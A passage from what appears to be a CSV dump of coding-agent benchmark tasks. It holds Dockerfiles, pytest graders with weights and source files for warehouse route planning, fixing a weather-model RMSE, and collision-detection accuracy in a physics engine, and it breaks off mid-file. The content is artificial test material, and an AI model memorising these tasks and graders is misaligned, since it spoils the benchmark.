\""071\"",\n    \""title\"": \""Speed Metal\"",\n    \""artist\"": \""Thrash Attack\"",\n    \""tempo\"": 180,\n    \""key\"": 11,\n    \""energy\"": 0.99,\n    \""danceability\"": 0.38,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -2.1\n  },\n  {\n    \""id\"": \""072\"",\n    \""title\"": \""Acid Jazz\"",\n    \""artist\"": \""Groove Collective\"",\n    \""tempo\"": 105,\n    \""key\"": 5,\n    \""energy\"": 0.71,\n    \""danceability\"": 0.74,\n    \""acousticness\"": 0.28,\n    \""loudness\"": -7.5\n  },\n  {\n    \""id\"": \""073\"",\n    \""title\"": \""Downtempo\"",\n    \""artist\"": \""Chill Out Room\"",\n    \""tempo\"": 90,\n    \""key\"": 3,\n    \""energy\"": 0.38,\n    \""danceability\"": 0.44,\n    \""acousticness\"": 0.41,\n    \""loudness\"": -13.5\n  },\n  {\n    \""id\"": \""074\"",\n    \""title\"": \""Eurodance\"",\n    \""artist\"": \""Club Europa\"",\n    \""tempo\"": 135,\n    \""key\"": 10,\n    \""energy\"": 0.9,\n    \""danceability\"": 0.92,\n    \""acousticness\"": 0.04,\n    \""loudness\"": -4.0\n  },\n  {\n    \""id\"": \""075\"",\n    \""title\"": \""Psychedelic Rock\"",\n    \""artist\"": \""Mind Trip\"",\n    \""tempo\"": 122,\n    \""key\"": 7,\n    \""energy\"": 0.79,\n    \""danceability\"": 0.56,\n    \""acousticness\"": 0.17,\n    \""loudness\"": -6.2\n  },\n  {\n    \""id\"": \""076\"",\n    \""title\"": \""Mambo\"",\n    \""artist\"": \""Cuban Fire\"",\n    \""tempo\"": 94,\n    \""key\"": 0,\n    \""energy\"": 0.83,\n    \""danceability\"": 0.89,\n    \""acousticness\"": 0.45,\n    \""loudness\"": -6.8\n  },\n  {\n    \""id\"": \""077\"",\n    \""title\"": \""Trip Hop\"",\n    \""artist\"": \""Bristol Sound\"",\n    \""tempo\"": 82,\n    \""key\"": 2,\n    \""energy\"": 0.51,\n    \""danceability\"": 0.58,\n    \""acousticness\"": 0.19,\n    \""loudness\"": -9.2\n  },\n  {\n    \""id\"": \""078\"",\n    \""title\"": \""Baroque Classical\"",\n    \""artist\"": \""Period Orchestra\"",\n    \""tempo\"": 96,\n    \""key\"": 9,\n    \""energy\"": 0.36,\n    \""danceability\"": 0.25,\n    \""acousticness\"": 0.98,\n    \""loudness\"": -17.5\n  },\n  {\n    \""id\"": \""079\"",\n    \""title\"": \""Electro Swing\"",\n    \""artist\"": \""Modern Vintage\"",\n    \""tempo\"": 128,\n    \""key\"": 4,\n    \""energy\"": 0.8,\n    \""danceability\"": 0.83,\n    \""acousticness\"": 0.35,\n    \""loudness\"": -5.8\n  },\n  {\n    \""id\"": \""080\"",\n    \""title\"": \""Doom Metal\"",\n    \""artist\"": \""Slow Crush\"",\n    \""tempo\"": 65,\n    \""key\"": 6,\n    \""energy\"": 0.76,\n    \""danceability\"": 0.28,\n    \""acousticness\"": 0.08,\n    \""loudness\"": -4.5\n  },\n  {\n    \""id\"": \""081\"",\n    \""title\"": \""K-Pop Energy\"",\n    \""artist\"": \""Seoul Stars\"",\n    \""tempo\"": 128,\n    \""key\"": 8,\n    \""energy\"": 0.87,\n    \""danceability\"": 0.91,\n    \""acousticness\"": 0.09,\n    \""loudness\"": -4.8\n  },\n  {\n    \""id\"": \""082\"",\n    \""title\"": \""Roots Reggae\"",\n    \""artist\"": \""Kingston Dub\"",\n    \""tempo\"": 75,\n    \""key\"": 1,\n    \""energy\"": 0.62,\n    \""danceability\"": 0.7,\n    \""acousticness\"": 0.42,\n    \""loudness\"": -8.8\n  },\n  {\n    \""id\"": \""083\"",\n    \""title\"": \""Math Rock\"",\n    \""artist\"": \""Complex Rhythms\"",\n    \""tempo\"": 147,\n    \""key\"": 11,\n    \""energy\"": 0.85,\n    \""danceability\"": 0.43,\n    \""acousticness\"": 0.15,\n    \""loudness\"": -5.9\n  },\n  {\n    \""id\"": \""084\"",\n    \""title\"": \""Tropical House\"",\n    \""artist\"": \""Beach Club\"",\n    \""tempo\"": 115,\n    \""key\"": 5,\n    \""energy\"": 0.73,\n    \""danceability\"": 0.84,\n    \""acousticness\"": 0.12,\n    \""loudness\"": -6.1\n  },\n  {\n    \""id\"": \""085\"",\n    \""title\"": \""Grime\"",\n    \""artist\"": \""East London\"",\n    \""tempo\"": 140,\n    \""key\"": 3,\n    \""energy\"": 0.92,\n    \""danceability\"": 0.76,\n    \""acousticness\"": 0.02,\n    \""loudness\"": -3.8\n  },\n  {\n    \""id\"": \""086\"",\n    \""title\"": \""Acoustic Blues\"",\n    \""artist\"": \""Delta Soul\"",\n    \""tempo\"": 88,\n    \""key\"": 10,\n    \""energy\"": 0.47,\n    \""danceability\"": 0.39,\n    \""acousticness\"": 0.86,\n    \""loudness\"": -11.2\n  },\n  {\n    \""id\"": \""087\"",\n    \""title\"": \""Tech House\"",\n    \""artist\"": \""Warehouse\"",\n    \""tempo\"": 125,\n    \""key\"": 7,\n    \""energy\"": 0.82,\n    \""danceability\"": 0.87,\n    \""acousticness\"": 0.03,\n    \""loudness\"": -5.0\n  },\n  {\n    \""id\"": \""088\"",\n    \""title\"": \""Flamenco Fire\"",\n    \""artist\"": \""Spanish Guitar\"",\n    \""tempo\"": 132,\n    \""key\"": 0,\n    \""energy\"": 0.88,\n    \""danceability\"": 0.72,\n    \""acousticness\"": 0.91,\n    \""loudness\"": -7.8\n  },\n  {\n    \""id\"": \""089\"",\n    \""title\"": \""Nu Metal\"",\n    \""artist\"": \""Hybrid Theory\"",\n    \""tempo\"": 95,\n    \""key\"": 2,\n    \""energy\"": 0.89,\n    \""danceability\"": 0.55,\n    \""acousticness\"": 0.06,\n    \""loudness\"": -3.9\n  },\n  {\n    \""id\"": \""090\"",\n    \""title\"": \""Lofi Hip Hop\"",\n    \""artist\"": \""Study Beats\"",\n    \""tempo\"": 85,\n    \""key\"": 9,\n    \""energy\"": 0.44,\n    \""danceability\"": 0.61,\n    \""acousticness\"": 0.32,\n    \""loudness\"": -10.5\n  },\n  {\n    \""id\"": \""091\"",\n    \""title\"": \""Vaporwave\"",\n    \""artist\"": \""Aesthetic\"",\n    \""tempo\"": 72,\n    \""key\"": 4,\n    \""energy\"": 0.35,\n    \""danceability\"": 0.51,\n    \""acousticness\"": 0.08,\n    \""loudness\"": -12.8\n  },\n  {\n    \""id\"": \""092\"",\n    \""title\"": \""Salsa Dura\"",\n    \""artist\"": \""Latin Fire\"",\n    \""tempo\"": 102,\n    \""key\"": 6,\n    \""energy\"": 0.91,\n    \""danceability\"": 0.95,\n    \""acousticness\"": 0.48,\n    \""loudness\"": -5.5\n  },\n  {\n    \""id\"": \""093\"",\n    \""title\"": \""Post Punk\"",\n    \""artist\"": \""Dark Wave\"",\n    \""tempo\"": 142,\n    \""key\"": 8,\n    \""energy\"": 0.81,\n    \""danceability\"": 0.63,\n    \""acousticness\"": 0.13,\n    \""loudness\"": -6.4\n  },\n  {\n    \""id\"": \""094\"",\n    \""title\"": \""Contemporary Classical\"",\n    \""artist\"": \""Modern Composers\"",\n    \""tempo\"": 60,\n    \""key\"": 1,\n    \""energy\"": 0.31,\n    \""danceability\"": 0.19,\n    \""acousticness\"": 0.88,\n    \""loudness\"": -18.9\n  },\n  {\n    \""id\"": \""095\"",\n    \""title\"": \""Dancehall\"",\n    \""artist\"": \""Jamaica Sound\"",\n    \""tempo\"": 95,\n    \""key\"": 11,\n    \""energy\"": 0.86,\n    \""danceability\"": 0.88,\n    \""acousticness\"": 0.11,\n    \""loudness\"": -5.1\n  },\n  {\n    \""id\"": \""096\"",\n    \""title\"": \""Progressive Metal\"",\n    \""artist\"": \""Time Signatures\"",\n    \""tempo\"": 135,\n    \""key\"": 5,\n    \""energy\"": 0.9,\n    \""danceability\"": 0.42,\n    \""acousticness\"": 0.07,\n    \""loudness\"": -4.2\n  },\n  {\n    \""id\"": \""097\"",\n    \""title\"": \""New Age\"",\n    \""artist\"": \""Crystal Meditation\"",\n    \""tempo\"": 68,\n    \""key\"": 3,\n    \""energy\"": 0.26,\n    \""danceability\"": 0.21,\n    \""acousticness\"": 0.65,\n    \""loudness\"": -20.5\n  },\n  {\n    \""id\"": \""098\"",\n    \""title\"": \""Drill\"",\n    \""artist\"": \""Chicago Streets\"",\n    \""tempo\"": 70,\n    \""key\"": 10,\n    \""energy\"": 0.9,\n    \""danceability\"": 0.73,\n    \""acousticness\"": 0.04,\n    \""loudness\"": -3.7\n  },\n  {\n    \""id\"": \""099\"",\n    \""title\"": \""Bebop Jazz\"",\n    \""artist\"": \""Cool Cats\"",\n    \""tempo\"": 165,\n    \""key\"": 7,\n    \""energy\"": 0.74,\n    \""danceability\"": 0.46,\n    \""acousticness\"": 0.82,\n    \""loudness\"": -9.5\n  },\n  {\n    \""id\"": \""100\"",\n    \""title\"": \""Future Garage\"",\n    \""artist\"": \""UK Bass\"",\n    \""tempo\"": 132,\n    \""key\"": 0,\n    \""energy\"": 0.77,\n    \""danceability\"": 0.8,\n    \""acousticness\"": 0.06,\n    \""loudness\"": -5.6\n  },\n  {\n    \""id\"": \""101\"",\n    \""title\"": \""Merengue\"",\n    \""artist\"": \""Dominican Heat\"",\n    \""tempo\"": 125,\n    \""key\"": 2,\n    \""energy\"": 0.85,\n    \""danceability\"": 0.9,\n    \""acousticness\"": 0.36,\n    \""loudness\"": -6.0\n  },\n  {\n    \""id\"": \""102\"",\n    \""title\"": \""Stoner Rock\"",\n    \""artist\"": \""Desert Sessions\"",\n    \""tempo\"": 78,\n    \""key\"": 9,\n    \""energy\"": 0.73,\n    \""danceability\"": 0.41,\n    \""acousticness\"": 0.16,\n    \""loudness\"": -5.8\n  },\n  {\n    \""id\"": \""103\"",\n    \""title\"": \""Liquid DnB\"",\n    \""artist\"": \""Smooth Breaks\"",\n    \""tempo\"": 174,\n    \""key\"": 4,\n    \""energy\"": 0.79,\n    \""danceability\"": 0.76,\n    \""acousticness\"": 0.1,\n    \""loudness\"": -6.5\n  },\n  {\n    \""id\"": \""104\"",\n    \""title\"": \""Bolero\"",\n    \""artist\"": \""Romance Latino\"",\n    \""tempo\"": 58,\n    \""key\"": 6,\n    \""energy\"": 0.39,\n    \""danceability\"": 0.33,\n    \""acousticness\"": 0.71,\n    \""loudness\"": -12.2\n  },\n  {\n    \""id\"": \""105\"",\n    \""title\"": \""Hardrock\"",\n    \""artist\"": \""Heavy Riffs\"",\n    \""tempo\"": 138,\n    \""key\"": 8,\n    \""energy\"": 0.92,\n    \""danceability\"": 0.59,\n    \""acousticness\"": 0.05,\n    \""loudness\"": -3.5\n  },\n  {\n    \""id\"": \""106\"",\n    \""title\"": \""Zouk\"",\n    \""artist\"": \""Caribbean Dance\"",\n    \""tempo\"": 112,\n    \""key\"": 1,\n    \""energy\"": 0.78,\n    \""danceability\"": 0.86,\n    \""acousticness\"": 0.23,\n    \""loudness\"": -6.9\n  },\n  {\n    \""id\"": \""107\"",\n    \""title\"": \""Melodic Dubstep\"",\n    \""artist\"": \""Future Bass Drop\"",\n    \""tempo\"": 70,\n    \""key\"": 11,\n    \""energy\"": 0.84,\n    \""danceability\"": 0.68,\n    \""acousticness\"": 0.07,\n    \""loudness\"": -4.7\n  },\n  {\n    \""id\"": \""108\"",\n    \""title\"": \""Traditional Folk\"",\n    \""artist\"": \""Heritage Songs\"",\n    \""tempo\"": 102,\n    \""key\"": 5,\n    \""energy\"": 0.52,\n    \""danceability\"": 0.56,\n    \""acousticness\"": 0.93,\n    \""loudness\"": -10.8\n  },\n  {\n    \""id\"": \""109\"",\n    \""title\"": \""Bass House\"",\n    \""artist\"": \""Club Banger\"",\n    \""tempo\"": 126,\n    \""key\"": 3,\n    \""energy\"": 0.93,\n    \""danceability\"": 0.89,\n    \""acousticness\"": 0.02,\n    \""loudness\"": -3.4\n  },\n  {\n    \""id\"": \""110\"",\n    \""title\"": \""Symphonic Metal\"",\n    \""artist\"": \""Orchestra Meets Metal\"",\n    \""tempo\"": 145,\n    \""key\"": 10,\n    \""energy\"": 0.94,\n    \""danceability\"": 0.47,\n    \""acousticness\"": 0.25,\n    \""loudness\"": -4.1\n  },\n  {\n    \""id\"": \""111\"",\n    \""title\"": \""Calypso\"",\n    \""artist\"": \""Trinidad Carnival\"",\n    \""tempo\"": 135,\n    \""key\"": 7,\n    \""energy\"": 0.82,\n    \""danceability\"": 0.85,\n    \""acousticness\"": 0.52,\n    \""loudness\"": -7.2\n  },\n  {\n    \""id\"": \""112\"",\n    \""title\"": \""Emo Rock\"",\n    \""artist\"": \""Heartbreak Hotel\"",\n    \""tempo\"": 158,\n    \""key\"": 0,\n    \""energy\"": 0.87,\n    \""danceability\"": 0.54,\n    \""acousticness\"": 0.14,\n    \""loudness\"": -5.3\n  },\n  {\n    \""id\"": \""113\"",\n    \""title\"": \""Minimal Wave\"",\n    \""artist\"": \""Cold Electronics\"",\n    \""tempo\"": 118,\n    \""key\"": 2,\n    \""energy\"": 0.64,\n    \""danceability\"": 0.72,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -7.9\n  },\n  {\n    \""id\"": \""114\"",\n    \""title\"": \""Cumbia\"",\n    \""artist\"": \""Colombian Rhythm\"",\n    \""tempo\"": 92,\n    \""key\"": 9,\n    \""energy\"": 0.76,\n    \""danceability\"": 0.83,\n    \""acousticness\"": 0.44,\n    \""loudness\"": -7.5\n  },\n  {\n    \""id\"": \""115\"",\n    \""title\"": \""Witch House\"",\n    \""artist\"": \""Dark Electronic\"",\n    \""tempo\"": 85,\n    \""key\"": 4,\n    \""energy\"": 0.69,\n    \""danceability\"": 0.64,\n    \""acousticness\"": 0.09,\n    \""loudness\"": -8.1\n  },\n  {\n    \""id\"": \""116\"",\n    \""title\"": \""Soca\"",\n    \""artist\"": \""Carnival Energy\"",\n    \""tempo\"": 145,\n    \""key\"": 6,\n    \""energy\"": 0.91,\n    \""danceability\"": 0.93,\n    \""acousticness\"": 0.18,\n    \""loudness\"": -4.9\n  },\n  {\n    \""id\"": \""117\"",\n    \""title\"": \""Gothic Rock\"",\n    \""artist\"": \""Dark Cathedral\"",\n    \""tempo\"": 125,\n    \""key\"": 8,\n    \""energy\"": 0.75,\n    \""danceability\"": 0.57,\n    \""acousticness\"": 0.2,\n    \""loudness\"": -6.6\n  },\n  {\n    \""id\"": \""118\"",\n    \""title\"": \""Footwork\"",\n    \""artist\"": \""Chicago Juke\"",\n    \""tempo\"": 160,\n    \""key\"": 1,\n    \""energy\"": 0.95,\n    \""danceability\"": 0.87,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -3.3\n  },\n  {\n    \""id\"": \""119\"",\n    \""title\"": \""Bro Country\"",\n    \""artist\"": \""Truck Yeah\"",\n    \""tempo\"": 108,\n    \""key\"": 11,\n    \""energy\"": 0.72,\n    \""danceability\"": 0.75,\n    \""acousticness\"": 0.38,\n    \""loudness\"": -6.8\n  },\n  {\n    \""id\"": \""120\"",\n    \""title\"": \""Synthpop\"",\n    \""artist\"": \""Electronic Dreams\"",\n    \""tempo\"": 120,\n    \""key\"": 5,\n    \""energy\"": 0.8,\n    \""danceability\"": 0.84,\n    \""acousticness\"": 0.04,\n    \""loudness\"": -5.5\n  }\n]""}",2025-07-21T14:20:25.726505,2025-07-21T14:20:25.726505
draft_dp_cd29f42f,medium,draft_dp_cd29f42f,software-engineering,The warehouse layout is in warehouse_layout.png and orders are in orders/. Need optimal routes for each order that visit all pickup locations and return to dropoff. Output route files to routes/ directory.,software-engineering,pathfinding|python|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required packages
RUN pip install pillow networkx

# Copy warehouse setup files
COPY generate_warehouse.py /app/
COPY order_001.json /app/orders/
COPY order_002.json /app/orders/
COPY order_003.json /app/orders/

# Generate the warehouse layout
RUN python generate_warehouse.py && rm generate_warehouse.py

# Create empty routes directory for agent output
RUN mkdir -p /app/routes","import os
import json

def test_route_files_created():
    """"""Test that route files are created for all orders.""""""
    order_files = [f for f in os.listdir('/app/orders') if f.endswith('.json')]
    
    for order_file in order_files:
        order_id = order_file.replace('order_', '').replace('.json', '')
        route_file = f'/app/routes/route_{order_id}.txt'
        assert os.path.exists(route_file), f""Route file missing for order {order_id}""

def test_routes_visit_all_locations():
    """"""Test that routes visit all required pickup locations.""""""
    order_files = [f for f in os.listdir('/app/orders') if f.endswith('.json')]
    
    for order_file in order_files:
        # Load order
        with open(f'/app/orders/{order_file}', 'r') as f:
            order = json.load(f)
        
        # Get expected locations
        expected_locations = {item['location'] for item in order['items']}
        
        # Read route file
        order_id = order['order_id']
        route_file = f'/app/routes/route_{order_id}.txt'
        
        if os.path.exists(route_file):
            with open(route_file, 'r') as f:
                route_content = f.read()
            
            # Check each location appears in route
            for location in expected_locations:
                assert location in route_content, f""Location {location} not found in route for order {order_id}""
            
            # Check route starts with START and ends with DROPOFF
            assert 'START' in route_content, f""Route for order {order_id} must start from START""
            assert 'DROPOFF' in route_content, f""Route for order {order_id} must end at DROPOFF""","{""test_route_files_created"": 0.3, ""test_routes_visit_all_locations"": 0.7}","{""order_003.json"": ""{\n  \""order_id\"": \""003\"",\n  \""items\"": [\n    {\""item\"": \""Part 1\"", \""location\"": \""G1\""},\n    {\""item\"": \""Part 2\"", \""location\"": \""G2\""}, \n    {\""item\"": \""Part 3\"", \""location\"": \""G3\""},\n    {\""item\"": \""Part 4\"", \""location\"": \""G4\""}\n  ]\n}"", ""order_002.json"": ""{\n  \""order_id\"": \""002\"", \n  \""items\"": [\n    {\""item\"": \""Gadget X\"", \""location\"": \""A1\""},\n    {\""item\"": \""Gadget Y\"", \""location\"": \""J4\""}\n  ]\n}"", ""generate_warehouse.py"": ""#!/usr/bin/env python3\nfrom PIL import Image, ImageDraw\nimport os\n\n# Create a simple warehouse layout\n# White = walkable paths\n# Gray = shelves  \n# Black = walls\n# Red = dropoff zone\n# Green = start zone\n\nWIDTH = 800\nHEIGHT = 600\nCELL_SIZE = 40\n\nimg = Image.new('RGB', (WIDTH, HEIGHT), 'black')\ndraw = ImageDraw.Draw(img)\n\n# Draw outer walls (black is default)\n\n# Draw walkable paths (white)\n# Main horizontal corridors\nfor y in [120, 240, 360, 480]:\n    draw.rectangle([40, y-20, WIDTH-40, y+20], fill='white')\n\n# Main vertical corridors  \nfor x in [120, 280, 440, 600]:\n    draw.rectangle([x-20, 40, x+20, HEIGHT-40], fill='white')\n\n# Draw shelves (gray) - placed between corridors\nshelf_color = (128, 128, 128)\n# Top row of shelves\nfor x in [160, 320, 480, 640]:\n    draw.rectangle([x, 60, x+80, 100], fill=shelf_color)\n    draw.text((x+10, 70), f\""{chr(65+(x//160))}\"", fill='black')\n    \n# Middle rows\nfor y, row in [(160, 'D'), (280, 'G'), (400, 'J')]:\n    for i, x in enumerate([160, 320, 480, 640]):\n        draw.rectangle([x, y, x+80, y+40], fill=shelf_color)\n        draw.text((x+10, y+10), f\""{row}{i+1}\"", fill='black')\n\n# Draw special zones\n# Start zone (green) - bottom left\ndraw.rectangle([60, HEIGHT-100, 140, HEIGHT-60], fill='green')\ndraw.text((75, HEIGHT-85), \""START\"", fill='black')\n\n# Dropoff zone (red) - bottom right  \ndraw.rectangle([WIDTH-140, HEIGHT-100, WIDTH-60, HEIGHT-60], fill='red')\ndraw.text((WIDTH-130, HEIGHT-85), \""DROPOFF\"", fill='black')\n\n# Save the image\nimg.save('/app/warehouse_layout.png')\nprint(\""Warehouse layout generated\"")\n\n# Create orders directory\nos.makedirs('/app/orders', exist_ok=True)\nos.makedirs('/app/routes', exist_ok=True)"", ""order_001.json"": ""{\n  \""order_id\"": \""001\"",\n  \""items\"": [\n    {\""item\"": \""Widget A\"", \""location\"": \""D1\""},\n    {\""item\"": \""Widget B\"", \""location\"": \""G3\""},\n    {\""item\"": \""Widget C\"", \""location\"": \""J2\""}\n  ]\n}""}",2025-07-21T16:43:34.281312,2025-07-21T16:43:34.281312
draft_dp_961441bb,hard,draft_dp_961441bb,machine-learning,The weather prediction model is failing CI - RMSE for temperature is 5.2°C but needs to be under 3°C. Fix the model and generate a 24hr forecast.,machine-learning,python|machine-learning|model-training,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install pandas numpy scikit-learn joblib

# Copy application files
COPY weather_model.py /app/
COPY generate_weather_data.py /app/

# Generate the weather data
RUN python generate_weather_data.py

# Set up the environment
CMD [""/bin/bash""]","import subprocess
import os
import json
import numpy as np

def test_model_accuracy():
    """"""Test that the model achieves RMSE < 3°C for temperature predictions""""""
    # Run the model training script
    result = subprocess.run(['python', 'weather_model.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Check if script ran successfully
    assert result.returncode == 0, f""Model training failed: {result.stderr}""
    
    # Extract RMSE from output
    output_lines = result.stdout.strip().split('\n')
    rmse_line = None
    for line in output_lines:
        if ""Temperature RMSE:"" in line:
            rmse_line = line
            break
    
    assert rmse_line is not None, ""RMSE not found in output""
    
    # Parse RMSE value
    rmse_str = rmse_line.split("":"")[1].strip().replace(""°C"", """")
    rmse = float(rmse_str)
    
    # Check RMSE is under threshold
    assert rmse < 3.0, f""RMSE {rmse}°C exceeds 3°C threshold""

def test_forecast_generation():
    """"""Test that 24-hour forecast JSON is generated correctly""""""
    # Check forecast file exists
    forecast_path = '/app/forecast_24hr.json'
    assert os.path.exists(forecast_path), ""Forecast file not created""
    
    # Load and validate forecast
    with open(forecast_path, 'r') as f:
        forecast = json.load(f)
    
    # Check forecast has 24 hours
    assert len(forecast) == 24, f""Expected 24 hour forecast, got {len(forecast)}""
    
    # Check each hour has required fields
    for i, hour_data in enumerate(forecast):
        assert 'datetime' in hour_data, f""Hour {i} missing datetime""
        assert 'temperature' in hour_data, f""Hour {i} missing temperature""
        
        # Check temperature is reasonable (between -30 and 50°C)
        temp = hour_data['temperature']
        assert -30 <= temp <= 50, f""Hour {i} temperature {temp}°C out of reasonable range""","{""test_model_accuracy"": 0.7, ""test_forecast_generation"": 0.3}","{""weather_model.py"": ""import pandas as pd\nimport numpy as np\nfrom sklearn.ensemble import RandomForestRegressor\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import mean_squared_error\nimport json\nfrom datetime import datetime, timedelta\nimport joblib\n\ndef load_and_preprocess_data(file_path):\n    \""\""\""Load weather data and prepare for modeling\""\""\""\n    df = pd.read_csv(file_path)\n    df['datetime'] = pd.to_datetime(df['datetime'])\n    df = df.sort_values('datetime')\n    \n    # Feature engineering\n    df['hour'] = df['datetime'].dt.hour\n    df['day_of_year'] = df['datetime'].dt.dayofyear\n    \n    # Handle missing values\n    df = df.dropna()\n    \n    return df\n\ndef train_model(df):\n    \""\""\""Train weather prediction model\""\""\""\n    features = ['pressure', 'humidity', 'hour']\n    target = 'temperature'\n    \n    X = df[features]\n    y = df[target]\n    \n    X_train, X_test, y_train, y_test = train_test_split(\n        X, y, test_size=0.2, random_state=42\n    )\n    \n    # Train model\n    model = RandomForestRegressor(n_estimators=10, max_depth=3, random_state=42)\n    model.fit(X_train, y_train)\n    \n    # Evaluate\n    y_pred = model.predict(X_test)\n    rmse = np.sqrt(mean_squared_error(y_test, y_pred))\n    print(f\""Temperature RMSE: {rmse:.2f}\u00b0C\"")\n    \n    return model, X_test, y_test\n\ndef generate_forecast(model, last_data):\n    \""\""\""Generate 24-hour forecast\""\""\""\n    forecast = []\n    current_time = datetime.now()\n    \n    for hour in range(24):\n        pred_data = {\n            'pressure': last_data['pressure'].iloc[-1],\n            'humidity': last_data['humidity'].iloc[-1], \n            'hour': (current_time + timedelta(hours=hour)).hour\n        }\n        \n        pred_df = pd.DataFrame([pred_data])\n        temp_pred = model.predict(pred_df)[0]\n        \n        forecast.append({\n            'datetime': (current_time + timedelta(hours=hour)).isoformat(),\n            'temperature': round(float(temp_pred), 1)\n        })\n    \n    return forecast\n\ndef main():\n    # Load data\n    df = load_and_preprocess_data('weather_data.csv')\n    \n    # Train model\n    model, X_test, y_test = train_model(df)\n    \n    # Save model\n    joblib.dump(model, 'weather_model.pkl')\n    \n    # Generate forecast\n    forecast = generate_forecast(model, df)\n    \n    with open('forecast_24hr.json', 'w') as f:\n        json.dump(forecast, f, indent=2)\n    \n    print(\""Model training complete. Forecast saved to forecast_24hr.json\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""generate_weather_data.py"": ""import pandas as pd\nimport numpy as np\nfrom datetime import datetime, timedelta\n\n# Generate realistic weather data\nnp.random.seed(42)\n\nstart_date = datetime(2023, 1, 1)\nend_date = datetime(2024, 1, 1)\nhours = int((end_date - start_date).total_seconds() / 3600)\n\ndates = [start_date + timedelta(hours=i) for i in range(hours)]\n\n# Generate correlated weather variables\nbase_temp = 15  # Base temperature in Celsius\nseasonal_amplitude = 10\n\ndata = []\nfor i, date in enumerate(dates):\n    # Seasonal variation\n    day_of_year = date.timetuple().tm_yday\n    seasonal_temp = base_temp + seasonal_amplitude * np.sin(2 * np.pi * day_of_year / 365 - np.pi/2)\n    \n    # Daily variation\n    hour_of_day = date.hour\n    daily_temp = seasonal_temp + 5 * np.sin(2 * np.pi * (hour_of_day - 6) / 24)\n    \n    # Add noise\n    temp = daily_temp + np.random.normal(0, 2)\n    \n    # Correlated variables\n    pressure = 1013 - 0.5 * (temp - base_temp) + np.random.normal(0, 5)\n    humidity = 60 - 1.5 * (temp - base_temp) + np.random.normal(0, 10)\n    humidity = max(20, min(100, humidity))  # Clamp humidity\n    \n    wind_speed = abs(np.random.normal(10, 5))\n    wind_direction = np.random.uniform(0, 360)\n    \n    # Precipitation more likely when humid and low pressure\n    precip_prob = (humidity - 50) / 100 + (1000 - pressure) / 100\n    precipitation = max(0, np.random.normal(0, 5)) if np.random.random() < precip_prob else 0\n    \n    cloud_cover = min(100, max(0, humidity - 20 + np.random.normal(0, 20)))\n    \n    data.append({\n        'datetime': date,\n        'temperature': round(temp, 1),\n        'pressure': round(pressure, 1),\n        'humidity': round(humidity, 1),\n        'wind_speed': round(wind_speed, 1),\n        'wind_direction': round(wind_direction, 1),\n        'precipitation': round(precipitation, 1),\n        'cloud_cover': round(cloud_cover, 1),\n        'station_id': 'STATION_001',\n        'latitude': 40.7128,\n        'longitude': -74.0060\n    })\n\ndf = pd.DataFrame(data)\ndf.to_csv('weather_data.csv', index=False)\nprint(f\""Generated {len(df)} hours of weather data\"")""}",2025-07-21T14:11:57.930924,2025-07-22T11:55:25.109751+00:00
draft_dp_450069a9,hard,draft_dp_450069a9,games,"The collision detection in our 2D game engine is failing ~18% of the time. Need it above 98% accuracy. Run the test suite to see current accuracy, then fix the physics_engine.py config.",games,python|physics|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install pygame and numpy
RUN pip install pygame numpy

# Copy the physics engine and test files
COPY physics_engine.py /app/
COPY test_collisions.py /app/

# Make test script executable
RUN chmod +x test_collisions.py

# Set up display for pygame (even though we won't use graphics)
ENV SDL_VIDEODRIVER=dummy","import subprocess
import os
import re

def test_collision_accuracy_above_98_percent():
    """"""Test that collision detection accuracy is above 98%""""""
    # Run the test suite to check collision accuracy
    result = subprocess.run(
        ['python', '/app/test_collisions.py'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    # Look for the accuracy line in the output
    accuracy_match = re.search(r'Collision Detection Accuracy: (\d+\.?\d*)%', result.stdout)
    assert accuracy_match is not None, ""Could not find accuracy in test output""
    
    accuracy = float(accuracy_match.group(1))
    assert accuracy > 98.0, f""Collision accuracy {accuracy}% is not above 98%""

def test_solution_file_exists():
    """"""Test that a solution file was created explaining the fix""""""
    # Check if solution.txt exists
    assert os.path.exists('/app/solution.txt'), ""No solution.txt file found""
    
    # Read the solution file
    with open('/app/solution.txt', 'r') as f:
        content = f.read().strip()
    
    # Check that it contains meaningful content about the fix
    assert len(content) > 10, ""Solution file is too short""
    assert 'collision' in content.lower() or 'config' in content.lower() or 'physics' in content.lower(), \
        ""Solution doesn't describe the collision detection fix""","{""test_collision_accuracy_above_98_percent"": 0.8, ""test_solution_file_exists"": 0.2}","{""physics_engine.py"": ""import pygame\nimport numpy as np\nfrom typing import List, Tuple, Dict, Set\nimport math\n\nclass PhysicsConfig:\n    # Grid cell size for spatial hashing (pixels)\n    GRID_CELL_SIZE = 128\n    \n    # Physics timestep\n    FIXED_TIMESTEP = 1/60.0\n    \n    # Collision detection tolerance\n    COLLISION_EPSILON = 0.1\n    \n    # Maximum velocity (pixels/second)\n    MAX_VELOCITY = 1000.0\n    \n    # Restitution (bounciness) factor\n    RESTITUTION = 0.8\n\nclass Body:\n    def __init__(self, x: float, y: float, width: float, height: float, vx: float = 0, vy: float = 0):\n        self.x = x\n        self.y = y\n        self.width = width\n        self.height = height\n        self.vx = vx\n        self.vy = vy\n        self.is_static = False\n        \n    def get_bounds(self) -> Tuple[float, float, float, float]:\n        return (self.x, self.y, self.x + self.width, self.y + self.height)\n    \n    def get_center(self) -> Tuple[float, float]:\n        return (self.x + self.width / 2, self.y + self.height / 2)\n\nclass SpatialHash:\n    def __init__(self, cell_size: int):\n        self.cell_size = cell_size\n        self.cells: Dict[Tuple[int, int], Set[Body]] = {}\n    \n    def clear(self):\n        self.cells.clear()\n    \n    def _get_cell_coords(self, x: float, y: float) -> Tuple[int, int]:\n        return (int(x // self.cell_size), int(y // self.cell_size))\n    \n    def insert(self, body: Body):\n        x1, y1, x2, y2 = body.get_bounds()\n        \n        # Get all cells this body overlaps\n        min_cell_x = int(x1 // self.cell_size)\n        max_cell_x = int(x2 // self.cell_size)\n        min_cell_y = int(y1 // self.cell_size)\n        max_cell_y = int(y2 // self.cell_size)\n        \n        for cx in range(min_cell_x, max_cell_x + 1):\n            for cy in 